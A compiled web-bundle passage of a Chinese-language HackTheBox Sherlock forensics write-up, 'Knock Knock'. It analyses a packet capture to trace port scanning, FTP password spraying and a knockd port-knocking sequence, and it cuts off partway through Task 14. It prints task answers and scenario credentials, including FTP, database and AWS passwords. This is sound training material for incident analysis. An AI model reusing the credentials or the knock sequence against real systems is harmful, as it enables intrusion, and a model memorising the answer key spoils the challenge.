"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[9890],{7296:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>l,contentTitle:()=>c,default:()=>h,frontMatter:()=>i,metadata:()=>r,toc:()=>d});var a=s(5893),t=s(1151);const i={},c="Knock Knock",r={id:"HackTheBox/Sherlocks/Knock-Knock/index",title:"Knock Knock",description:"A critical Forela Dev server was targeted by a threat group. The Dev server was accidentally left open to the internet which it was not supposed to be. The senior dev Abdullah told the IT team that the server was fully hardened and it's still difficult to comprehend how the attack took place and how the attacker got access in the first place. Forela recently started its business expansion in Pakistan and Abdullah was the one IN charge of all infrastructure deployment and management. The Security Team need to contain and remediate the threat as soon as possible as any more damage can be devastating for the company, especially at the crucial stage of expanding in other region. Thankfully a packet capture tool was running in the subnet which was set up a few months ago. A packet capture is provided to you around the time of the incident (1-2) days margin because we don't know exactly when the attacker gained access. As our forensics analyst, you have been provided the packet capture to assess how the attacker gained access. Warning : This Sherlock will require an element of OSINT to complete fully.",source:"@site/docs/HackTheBox/Sherlocks/Knock-Knock/index.md",sourceDirName:"HackTheBox/Sherlocks/Knock-Knock",slug:"/HackTheBox/Sherlocks/Knock-Knock/",permalink:"/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/Knock-Knock/",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackTheBox/Sherlocks/Knock-Knock/index.md",tags:[],version:"current",frontMatter:{},sidebar:"HackTheBox_Sidebar",previous:{title:"Hyperfiletable",permalink:"/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/Hyperfiletable/"},next:{title:"Litter",permalink:"/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/Litter/"}},l={},d=[{value:"\u9898\u76ee\u6570\u636e",id:"\u9898\u76ee\u6570\u636e",level:2},{value:"\u6570\u636e\u9884\u5904\u7406",id:"\u6570\u636e\u9884\u5904\u7406",level:2},{value:"Task 1",id:"task-1",level:2},{value:"Task 2",id:"task-2",level:2},{value:"Task 3",id:"task-3",level:2},{value:"Task 4",id:"task-4",level:2},{value:"Task 5",id:"task-5",level:2},{value:"Task 6",id:"task-6",level:2},{value:"Task 7",id:"task-7",level:2},{value:"Task 8",id:"task-8",level:2},{value:"Task 9",id:"task-9",level:2},{value:"Task 10",id:"task-10",level:2},{value:"Task 11",id:"task-11",level:2},{value:"Task 12",id:"task-12",level:2},{value:"Task 13",id:"task-13",level:2},{value:"Task 14",id:"task-14",level:2},{value:"Task 15",id:"task-15",level:2},{value:"Task 16",id:"task-16",level:2},{value:"Task 17",id:"task-17",level:2},{value:"Task 18",id:"task-18",level:2},{value:"Task 19",id:"task-19",level:2},{value:"Task 20",id:"task-20",level:2},{value:"Task 21",id:"task-21",level:2}];function o(e){const n={a:"a",admonition:"admonition",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",img:"img",p:"p",pre:"pre",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",...(0,t.a)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.h1,{id:"knock-knock",children:"Knock Knock"}),"\n",(0,a.jsxs)(n.admonition,{title:"Sherlock Scenario",type:"info",children:[(0,a.jsx)(n.p,{children:"A critical Forela Dev server was targeted by a threat group. The Dev server was accidentally left open to the internet which it was not supposed to be. The senior dev Abdullah told the IT team that the server was fully hardened and it's still difficult to comprehend how the attack took place and how the attacker got access in the first place. Forela recently started its business expansion in Pakistan and Abdullah was the one IN charge of all infrastructure deployment and management. The Security Team need to contain and remediate the threat as soon as possible as any more damage can be devastating for the company, especially at the crucial stage of expanding in other region. Thankfully a packet capture tool was running in the subnet which was set up a few months ago. A packet capture is provided to you around the time of the incident (1-2) days margin because we don't know exactly when the attacker gained access. As our forensics analyst, you have been provided the packet capture to assess how the attacker gained access. Warning : This Sherlock will require an element of OSINT to complete fully."}),(0,a.jsx)(n.p,{children:"\u4e00\u5bb6\u5173\u952e\u7684 Forela Dev \u670d\u52a1\u5668\u53d7\u5230\u4e86\u5a01\u80c1\u7ec4\u7684\u653b\u51fb\u3002Dev \u670d\u52a1\u5668\u88ab\u610f\u5916\u5730\u66b4\u9732\u5728\u4e92\u8054\u7f51\u4e0a\uff0c\u800c\u8fd9\u5e76\u4e0d\u662f\u5b83\u5e94\u8be5\u5b58\u5728\u7684\u4f4d\u7f6e\u3002\u9ad8\u7ea7\u5f00\u53d1\u8005 Abdullah \u544a\u8bc9 IT \u56e2\u961f\u670d\u52a1\u5668\u5df2\u7ecf\u5b8c\u5168\u5f3a\u5316\uff0c\u5f88\u96be\u7406\u89e3\u653b\u51fb\u662f\u5982\u4f55\u53d1\u751f\u4ee5\u53ca\u653b\u51fb\u8005\u662f\u5982\u4f55\u9996\u6b21\u83b7\u53d6\u8bbf\u95ee\u6743\u9650\u7684\u3002Forela \u6700\u8fd1\u5f00\u59cb\u5728\u5df4\u57fa\u65af\u5766\u8fdb\u884c\u4e1a\u52a1\u6269\u5c55\uff0c\u800c Abdullah \u6b63\u662f\u8d1f\u8d23\u6240\u6709\u57fa\u7840\u67b6\u6784\u7684\u90e8\u7f72\u548c\u7ba1\u7406\u3002\u5b89\u5168\u56e2\u961f\u9700\u8981\u5c3d\u5feb\u63a7\u5236\u548c\u6d88\u9664\u5a01\u80c1\uff0c\u56e0\u4e3a\u4efb\u4f55\u8fdb\u4e00\u6b65\u7684\u635f\u5bb3\u5bf9\u516c\u53f8\u90fd\u53ef\u80fd\u662f\u6bc1\u706d\u6027\u7684\uff0c\u7279\u522b\u662f\u5728\u6269\u5c55\u5230\u5176\u4ed6\u5730\u533a\u7684\u5173\u952e\u9636\u6bb5\u3002\u5e78\u8fd0\u7684\u662f\uff0c\u51e0\u4e2a\u6708\u524d\u5728\u5b50\u7f51\u4e2d\u8bbe\u7f6e\u4e86\u4e00\u4e2a\u6570\u636e\u5305\u6355\u83b7\u5de5\u5177\u3002\u63d0\u4f9b\u7ed9\u60a8\u7684\u6570\u636e\u5305\u6355\u83b7\u6587\u4ef6\u5927\u81f4\u662f\u5728\u4e8b\u4ef6\u53d1\u751f\u65f6\uff08\u63d0\u4f9b\u4e86 1-2 \u5929\u7684\u65f6\u95f4\u4f59\u5730\uff09\uff0c\u56e0\u4e3a\u6211\u4eec\u4e0d\u786e\u5b9a\u653b\u51fb\u8005\u786e\u5207\u83b7\u53d6\u8bbf\u95ee\u6743\u9650\u7684\u65f6\u95f4\u3002\u4f5c\u4e3a\u6211\u4eec\u7684\u53d6\u8bc1\u5206\u6790\u5e08\uff0c\u60a8\u5df2\u88ab\u63d0\u4f9b\u6570\u636e\u5305\u6355\u83b7\u6587\u4ef6\uff0c\u4ee5\u8bc4\u4f30\u653b\u51fb\u8005\u662f\u5982\u4f55\u83b7\u53d6\u8bbf\u95ee\u6743\u9650\u7684\u3002\u8b66\u544a\uff1a\u6b64\u6b21\u8c03\u67e5\u9700\u8981\u4e00\u5b9a\u7684\u5f00\u6e90\u60c5\u62a5\u641c\u96c6\u624d\u80fd\u5b8c\u5168\u5b8c\u6210\u3002"})]}),"\n",(0,a.jsx)(n.h2,{id:"\u9898\u76ee\u6570\u636e",children:"\u9898\u76ee\u6570\u636e"}),"\n",(0,a.jsx)(n.admonition,{title:"\u9644\u4ef6\u8f83\u5927",type:"warning",children:(0,a.jsx)(n.p,{children:"\u7531\u4e8e\u9644\u4ef6\u8f83\u5927\uff0c\u6240\u4ee5\u4e0d\u63d0\u4f9b\u955c\u50cf\u4e0b\u8f7d\u670d\u52a1"})}),"\n",(0,a.jsx)(n.h2,{id:"\u6570\u636e\u9884\u5904\u7406",children:"\u6570\u636e\u9884\u5904\u7406"}),"\n",(0,a.jsx)(n.p,{children:"\u7531\u4e8e\u6d41\u91cf\u5305\u8f83\u5927\uff0c\u6240\u4ee5\u6211\u4eec\u5148\u5bf9\u6d41\u91cf\u5305\u7684\u6570\u636e\u8fdb\u884c\u521d\u6b65\u63d0\u53d6\u548c\u7814\u5224"}),"\n",(0,a.jsxs)(n.p,{children:["\u901a\u8fc7 \u6587\u4ef6 -> \u5bfc\u51fa\u5bf9\u8c61 \u529f\u80fd\uff0c\u6211\u4eec\u53ef\u4ee5\u5148\u5bf9\u6d41\u91cf\u4e2d\u4f20\u8f93\u8fc7\u7684\u6587\u4ef6\u8fdb\u884c\u521d\u6b65\u5206\u6790\uff0c\u5728 ",(0,a.jsx)(n.code,{children:"FTP"})," \u534f\u8bae\u4e2d\u627e\u5230\u4ee5\u4e0b\u6587\u4ef6"]}),"\n",(0,a.jsxs)(n.table,{children:[(0,a.jsx)(n.thead,{children:(0,a.jsxs)(n.tr,{children:[(0,a.jsx)(n.th,{style:{textAlign:"center"},children:"\u4e3b\u673a\u540d"}),(0,a.jsx)(n.th,{style:{textAlign:"center"},children:"\u6587\u4ef6\u540d"})]})}),(0,a.jsxs)(n.tbody,{children:[(0,a.jsxs)(n.tr,{children:[(0,a.jsx)(n.td,{style:{textAlign:"center"},children:"172.31.39.46"}),(0,a.jsx)(n.td,{style:{textAlign:"center"},children:".backup"})]}),(0,a.jsxs)(n.tr,{children:[(0,a.jsx)(n.td,{style:{textAlign:"center"},children:"172.31.39.46"}),(0,a.jsx)(n.td,{style:{textAlign:"center"},children:"fetch.sh"})]})]})]}),"\n",(0,a.jsx)(n.p,{children:"\u7136\u540e\u67e5\u770b\u6587\u4ef6\u5185\u5bb9"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",metastring:'title="fetch.sh"',children:'#!/bin/bash\n\n# Define variables\nDB_HOST="3.13.65.234"\nDB_PORT="3306"\nDB_USER="tony.shephard"\nDB_PASSWORD="GameOfthronesRocks7865!"\nDB_NAME="Internal_Tasks"\nQUERY="SELECT * FROM Tasks;"\n\n# Execute query and store result in a variable\nRESULT=$(mysql -h $DB_HOST -P $DB_PORT -u $DB_USER -p$DB_PASSWORD $DB_NAME -e "$QUERY")\n\n# Print the result\necho "$RESULT"\n'})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title=".backup"',children:"[options]\n    UseSyslog\n\n[FTP-INTERNAL]\n    sequence    = 29999,50234,45087\n    seq_timeout = 5\n    command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 24456 -j ACCEPT\n    tcpflags    = syn\n\n\n# Creds for the other backup server abdullah.yasin:XhlhGame_90HJLDASxfd&hoooad\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u901a\u8fc7\u4e0a\u9762\u5f97\u5230\u7684\u4fe1\u606f\uff0c\u53ef\u4ee5\u521d\u6b65\u5224\u65ad\u6570\u636e\u5e93\u4e3b\u673a\u7684 ip \u5730\u5740\u662f ",(0,a.jsx)(n.code,{children:"3.13.65.234"}),"\uff0c\u5e76\u4e14\u8bf7\u6c42\u7684\u4e3b\u673a\u4e3a ",(0,a.jsx)(n.code,{children:"3.109.209.43"}),"\uff0c\u8fd9\u4e2a\u8bf7\u6c42\u7684\u4e3b\u673a\u53ef\u4ee5\u786e\u5b9a\u4e3a\u653b\u51fb\u8005\u7684 ip \u5730\u5740"]}),"\n",(0,a.jsx)(n.h2,{id:"task-1",children:"Task 1"}),"\n",(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsx)(n.p,{children:"\u653b\u51fb\u8005\u5728\u679a\u4e3e\u9636\u6bb5\u53d1\u73b0\u4e86\u54ea\u4e9b\u7aef\u53e3\u662f\u5f00\u653e\u7684\uff1f"}),"\n"]}),"\n",(0,a.jsxs)(n.p,{children:["\u6839\u636e tcp \u534f\u8bae\u6240\u89c4\u5b9a\u7684\u7aef\u53e3\u76f8\u5e94\u7684\u7b56\u7565\uff0c\u53ef\u4ee5\u901a\u8fc7\u68c0\u67e5 ",(0,a.jsx)(n.code,{children:"SYN"})," \u548c ",(0,a.jsx)(n.code,{children:"ACK"})," \u7684\u54cd\u5e94\u503c\uff0c\u6765\u5224\u65ad\u7aef\u53e3\u662f\u5426\u5f00\u653e"]}),"\n",(0,a.jsx)(n.p,{children:"\u5bf9\u5e94\u7684\u7b5b\u9009\u5668\u8868\u8fbe\u5f0f\u4e3a"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"tcp.flags.syn==1 and tcp.flags.ack==1\n"})}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"wireshark",src:s(1353).Z+"",width:"1920",height:"1050"})}),"\n",(0,a.jsx)(n.p,{children:"\u4f46\u662f\u53d1\u73b0\u6570\u636e\u91cf\u8fc7\u5927\uff0c\u4e8e\u662f\u53ef\u4ee5\u68c0\u67e5\u4e0a\u9762\u53d1\u73b0\u7684\u6570\u636e\u5e93\u4e3b\u673a\u7684 ip"}),"\n",(0,a.jsx)(n.p,{children:"\u5bf9\u5e94\u7684\u7b5b\u9009\u5668\u8868\u8fbe\u5f0f\u4e3a"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"tcp.flags.syn==1 and tcp.flags.ack==1 and ip.addr==3.109.209.43\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u540c\u65f6\u7531\u4e8e\u540e\u671f\u8fdb\u884c\u4e86\u5176\u4ed6\u4f1a\u8bdd\uff0c\u6240\u4ee5\u5728 wireshark \u4e2d\u786e\u8ba4\u4e00\u4e0b\u7aef\u53e3\u626b\u63cf\u53d1\u751f\u7684\u5927\u81f4\u65f6\u95f4\u70b9\uff0c\u7136\u540e\u505a\u8fdb\u4e00\u6b65\u7ec6\u5206"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"tcp.flags.syn==1 and tcp.flags.ack==1 and ip.addr==3.109.209.43 && frame.number<=207500\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u7531\u4e8e\u5b58\u5728\u5927\u91cf\u91cd\u590d\u6570\u636e\uff0c\u6240\u4ee5\u76f4\u63a5\u4f7f\u7528 tshark + sort + uniq + sed \u8fdb\u884c\u5904\u7406"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"$tshark -r Capture.pcap -T fields -Y \"tcp.flags.syn==1 and tcp.flags.ack==1 and ip.addr==3.109.209.43 && frame.number<=207500\" -e tcp.srcport | sort -n | uniq | sed ':a;N;$!ba;s/\\n/,/g'\n21,22,3306,6379,8086\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"21,22,3306,6379,8086\n"})}),"\n",(0,a.jsx)(n.h2,{id:"task-2",children:"Task 2"}),"\n",(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsx)(n.p,{children:"\u653b\u51fb\u8005\u5f00\u59cb\u5bf9\u670d\u52a1\u5668\u8fdb\u884c\u653b\u51fb\u7684\u4e16\u754c\u534f\u8c03\u65f6\u95f4\u662f\u591a\u5c11\uff1f"}),"\n"]}),"\n",(0,a.jsxs)(n.p,{children:["\u6839\u636e\u4e0a\u6587\u7684\u95ee\u9898\uff0c\u5c06\u76ee\u6807\u805a\u96c6\u5728 ",(0,a.jsx)(n.code,{children:"3.13.65.234"})," \u8fd9\u53f0\u670d\u52a1\u5668\u4e0a\uff0c\u4f7f\u7528"]}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.code,{children:"ip.addr==3.109.209.43"})}),"\n",(0,a.jsx)(n.p,{children:"\u8fdb\u884c\u7b5b\u9009\uff0c\u7b2c\u4e00\u6761\u8bb0\u5f55\u7ecf\u8fc7\u786e\u8ba4\uff0c\u5c31\u662f\u653b\u51fb\u8005\u5f00\u59cb\u626b\u63cf\u7aef\u53e3\u7684\u8bb0\u5f55\uff0c\u6b64\u8bb0\u5f55\u7684\u65f6\u95f4\u5c31\u662f\u653b\u51fb\u8005\u5f00\u59cb\u653b\u51fb\u7684\u65f6\u95f4"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"21/03/2023 10:42:23\n"})}),"\n",(0,a.jsx)(n.h2,{id:"task-3",children:"Task 3"}),"\n",(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsx)(n.p,{children:"\u653b\u51fb\u8005\u7528\u4e8e\u83b7\u53d6\u521d\u59cb\u8bbf\u95ee\u6743\u9650\u7684 MITRE \u6280\u672f ID \u662f\u4ec0\u4e48\uff1f"}),"\n"]}),"\n",(0,a.jsxs)(n.p,{children:["\u7531\u4e8e\u539f\u59cb\u6570\u636e\u5305\u5927\u5c0f\u8f83\u5927\uff0c\u6240\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u7b5b\u9009\u5668\u8fdb\u884c\u5bfc\u51fa\u7279\u5b9a\u5206\u7ec4\u6570\u636e\uff0c\u4fdd\u5b58\u4e3a ",(0,a.jsx)(n.code,{children:"1.pcap"})]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"ip.addr==3.109.209.43 && ip.addr==172.31.39.46\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u901a\u8fc7\u5206\u6790\u5355\u72ec\u5bfc\u51fa\u5206\u7ec4\u540e\u7684\u6570\u636e\uff0c\u53ef\u4ee5\u53d1\u73b0\u524d\u9762\u90e8\u5206\u7684\u6d41\u91cf\uff0c\u90fd\u662f\u653b\u51fb\u8005\u5728\u6267\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u6240\u4ee5\u901a\u8fc7\u5b9a\u4f4d\u76f8\u5173\u5305\uff0c\u53ef\u4ee5\u8fdb\u4e00\u6b65\u5c06\u7aef\u53e3\u626b\u63cf\u90e8\u5206\u7684\u6570\u636e\u8fdb\u884c\u5254\u9664"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"frame.number > 131092\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u4f7f\u7528\u7b5b\u9009\u5668\uff0c\u5bfc\u51fa\u7279\u5b9a\u5206\u7ec4\u4e3a ",(0,a.jsx)(n.code,{children:"2.pcap"})]}),"\n",(0,a.jsxs)(n.p,{children:["\u901a\u8fc7\u5bf9\u5bfc\u51fa\u7684 ",(0,a.jsx)(n.code,{children:"2.pcap"})," \u5176\u4e2d\u7684\u6d41\u91cf\u8fdb\u4e00\u6b65\u505a\u5206\u6790\uff0c\u53ef\u4ee5\u53d1\u73b0\u653b\u51fb\u8005\u540e\u7eed\u53d1\u8d77\u4e86\u5927\u91cf\u7684 ftp \u767b\u9646\u5c1d\u8bd5\uff0c\u9488\u5bf9\u6bcf\u4e2a\u7528\u6237\u90fd\u5728\u5c1d\u8bd5\u56fa\u5b9a\u7684\u4e00\u4efd\u5bc6\u7801\u5b57\u5178\uff0c\u53ef\u4ee5\u5224\u65ad\u4e3a\u5bc6\u7801\u55b7\u6d12\u653b\u51fb"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"T1110.003\n"})}),"\n",(0,a.jsx)(n.h2,{id:"task-4",children:"Task 4"}),"\n",(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsx)(n.p,{children:"\u7528\u4e8e\u83b7\u53d6\u521d\u59cb\u7acb\u8db3\u70b9\u7684\u6709\u6548\u51ed\u636e\u96c6\u662f\u4ec0\u4e48\uff1f"}),"\n"]}),"\n",(0,a.jsx)(n.p,{children:"\u4f7f\u7528\u4ee5\u4e0b\u7b5b\u9009\u5668\u8fdb\u884c\u7b5b\u9009"}),"\n",(0,a.jsx)(n.p,{children:"\u5f80\u540e\u9762\u7ffb\u5373\u53ef\u5f97\u5230"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"tony.shephard:Summer2023!\n"})}),"\n",(0,a.jsx)(n.h2,{id:"task-5",children:"Task 5"}),"\n",(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsx)(n.p,{children:"\u653b\u51fb\u8005\u7528\u4e8e\u521d\u59cb\u8bbf\u95ee\u7684\u6076\u610f IP \u5730\u5740\u662f\u591a\u5c11\uff1f"}),"\n"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"3.109.209.43\n"})}),"\n",(0,a.jsx)(n.h2,{id:"task-6",children:"Task 6"}),"\n",(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsx)(n.p,{children:"\u5305\u542b\u4e00\u4e9b\u914d\u7f6e\u6570\u636e\u548c\u51ed\u636e\u7684\u6587\u4ef6\u540d\u79f0\u662f\u4ec0\u4e48\uff1f"}),"\n"]}),"\n",(0,a.jsx)(n.p,{children:"\u6570\u636e\u9884\u5904\u7406\u9636\u6bb5\u5df2\u7ecf\u5f97\u5230"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:".backup\n"})}),"\n",(0,a.jsx)(n.h2,{id:"task-7",children:"Task 7"}),"\n",(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsx)(n.p,{children:"\u5173\u952e\u670d\u52a1\u8fd0\u884c\u5728\u54ea\u4e2a\u7aef\u53e3\u4e0a\uff1f"}),"\n"]}),"\n",(0,a.jsxs)(n.p,{children:["\u770b ",(0,a.jsx)(n.code,{children:".backup"})," \u6587\u4ef6\u4e2d\u7684\u914d\u7f6e\u9879\uff0c\u5373\u53ef\u5f97\u5230"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"24456\n"})}),"\n",(0,a.jsx)(n.h2,{id:"task-8",children:"Task 8"}),"\n",(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsx)(n.p,{children:"\u7528\u4e8e\u8bbf\u95ee\u8be5\u5173\u952e\u670d\u52a1\u7684\u6280\u672f\u540d\u79f0\u662f\u4ec0\u4e48\uff1f"}),"\n"]}),"\n",(0,a.jsxs)(n.p,{children:["\u901a\u8fc7\u5bf9 ",(0,a.jsx)(n.code,{children:".backup"})," \u8fd9\u4e2a\u914d\u7f6e\u6587\u4ef6\u8fdb\u884c\u5206\u6790\uff0c\u53ef\u4ee5\u770b\u51fa\u8fd9\u4e2a\u662f ",(0,a.jsx)(n.code,{children:"knockd"})," \u670d\u52a1\u7684\u914d\u7f6e\u6587\u4ef6"]}),"\n",(0,a.jsxs)(n.p,{children:["\u53ef\u4ee5\u53c2\u8003\uff1a",(0,a.jsx)(n.a,{href:"https://resources.infosecinstitute.com/topics/mitre-attck/mitre-attck-port-knocking/",children:"MITRE ATT&CK: Port knocking"})]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"Port knocking\n"})}),"\n",(0,a.jsx)(n.h2,{id:"task-9",children:"Task 9"}),"\n",(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsx)(n.p,{children:"\u9700\u8981\u4e0e\u4e4b\u4ea4\u4e92\u4ee5\u8fbe\u5230\u5173\u952e\u670d\u52a1\u7684\u54ea\u4e9b\u7aef\u53e3\uff1f"}),"\n"]}),"\n",(0,a.jsxs)(n.p,{children:["\u770b ",(0,a.jsx)(n.code,{children:".backup"})," \u914d\u7f6e\u6587\u4ef6\u5185\u5bb9\u5373\u53ef"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"29999,45087,50234\n"})}),"\n",(0,a.jsx)(n.h2,{id:"task-10",children:"Task 10"}),"\n",(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsx)(n.p,{children:"\u4e0e\u4e0a\u4e00\u4e2a\u95ee\u9898\u7aef\u53e3\u4ea4\u4e92\u7ed3\u675f\u7684\u4e16\u754c\u534f\u8c03\u65f6\u95f4\u662f\u591a\u5c11\uff1f"}),"\n"]}),"\n",(0,a.jsx)(n.p,{children:"\u4f7f\u7528\u7b5b\u9009\u5668\u5b9a\u4f4d\u8fd9\u4e09\u4e2a\u7aef\u53e3"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"tcp.port==29999 || tcp.port==45087 || tcp.port==50234\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u5b9a\u4f4d\u65f6\u95f4\u6700\u665a\u7684\u90a3\u4e00\u6761\u8bb0\u5f55\u5373\u53ef"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"21/03/2023 10:58:50\n"})}),"\n",(0,a.jsx)(n.h2,{id:"task-11",children:"Task 11"}),"\n",(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsx)(n.p,{children:"\u7528\u4e8e\u5173\u952e\u670d\u52a1\u7684\u4e00\u7ec4\u6709\u6548\u51ed\u636e\u662f\u4ec0\u4e48\uff1f"}),"\n"]}),"\n",(0,a.jsxs)(n.p,{children:["\u770b ",(0,a.jsx)(n.code,{children:".backup"})," \u6587\u4ef6\u4e2d\u7684\u914d\u7f6e\u9879\uff0c\u5373\u53ef\u5f97\u5230"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"abdullah.yasin:XhlhGame_90HJLDASxfd&hoooad\n"})}),"\n",(0,a.jsx)(n.h2,{id:"task-12",children:"Task 12"}),"\n",(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsx)(n.p,{children:"\u653b\u51fb\u8005\u4f55\u65f6\u4ee5\u4e16\u754c\u534f\u8c03\u65f6\u95f4\u83b7\u5f97\u4e86\u5bf9\u5173\u952e\u670d\u52a1\u5668\u7684\u8bbf\u95ee\u6743\u9650\uff1f"}),"\n"]}),"\n",(0,a.jsxs)(n.p,{children:["\u901a\u8fc7\u7ee7\u7eed\u8ffd\u8e2a\u6d41\u91cf\uff0c\u53ef\u4ee5\u53d1\u73b0\u653b\u51fb\u8005\u4f7f\u7528\u4e86 ",(0,a.jsx)(n.code,{children:"Task 11"})," \u4e2d\u7684\u51ed\u636e\u518d\u6b21\u767b\u9646\u4e86\u670d\u52a1\u5668"]}),"\n",(0,a.jsxs)(n.p,{children:["\u8fd9\u91cc\u63d0\u4ea4\u7684\u65f6\u95f4\uff0c\u6307\u670d\u52a1\u5668\u8fd4\u56de\u7ed9\u653b\u51fb\u8005 ",(0,a.jsx)(n.code,{children:"230 Login successful."})," \u7684\u65f6\u95f4"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"21/03/2023 11:00:01\n"})}),"\n",(0,a.jsx)(n.h2,{id:"task-13",children:"Task 13"}),"\n",(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsx)(n.p,{children:"\u5f00\u53d1\u8005 \u201cAbdullah\u201d \u7684 AWS \u8d26\u6237 ID \u548c\u5bc6\u7801\u662f\u4ec0\u4e48\uff1f"}),"\n"]}),"\n",(0,a.jsxs)(n.p,{children:["\u5728\u653b\u51fb\u8005\u767b\u5f55 ftp \u670d\u52a1\u4e4b\u540e\uff0c\u53ef\u4ee5\u53d1\u73b0\u653b\u51fb\u8005\u83b7\u53d6\u4e86 ",(0,a.jsx)(n.code,{children:".archived.sql"})," \u8fd9\u4e2a\u6587\u4ef6\uff0c\u5176\u4e2d\u542b\u6709\u4ee5\u4e0b\u6570\u636e"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-sql",children:"DROP TABLE IF EXISTS `AWS_EC2_DEV`;\n/*!40101 SET @saved_cs_client     = @@character_set_client */;\n/*!50503 SET character_set_client = utf8mb4 */;\nCREATE TABLE `AWS_EC2_DEV` (\n  `NAME` varchar(40) DEFAULT NULL,\n  `AccountID` varchar(40) DEFAULT NULL,\n  `Password` varchar(60) NOT NULL\n) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;\n/*!40101 SET character_set_client = @saved_cs_client */;\n\n--\n-- Dumping data for table `AWS_EC2_DEV`\n--\n\nLOCK TABLES `AWS_EC2_DEV` WRITE;\n/*!40000 ALTER TABLE `AWS_EC2_DEV` DISABLE KEYS */;\nINSERT INTO `AWS_EC2_DEV` VALUES ('Alonzo','341624703104',''),(NULL,NULL,'d;089gjbj]jhTVLXEROP.madsfg'),('Abdullah','391629733297','yiobkod0986Y[adij@IKBDS');\n/*!40000 ALTER TABLE `AWS_EC2_DEV` ENABLE KEYS */;\nUNLOCK TABLES;\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"391629733297:yiobkod0986Y[adij@IKBDS\n"})}),"\n",(0,a.jsx)(n.h2,{id:"task-14",children:"Task 14"}),"\n",(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsx)(n.p,{children:"Forela \u516c\u53f8\u62db\u8058\u5f00\u53d1\u4eba\u5458\u7684\u622a\u6b62\u65e5\u671f\u662f\u4ec0\u4e48\u65f6\u5019\uff1f"}),"\n"]}),"\n",(0,a.jsxs)(n.p,{children:["\u5728 ftp \u4f20\u8f93\u7684\u6587\u4ef6\u4e2d\uff0c\u53d1\u73b0\u6709\u4e00\u4e2a ",(0,a.jsx)(n.code,{children:"Done.docx"})," 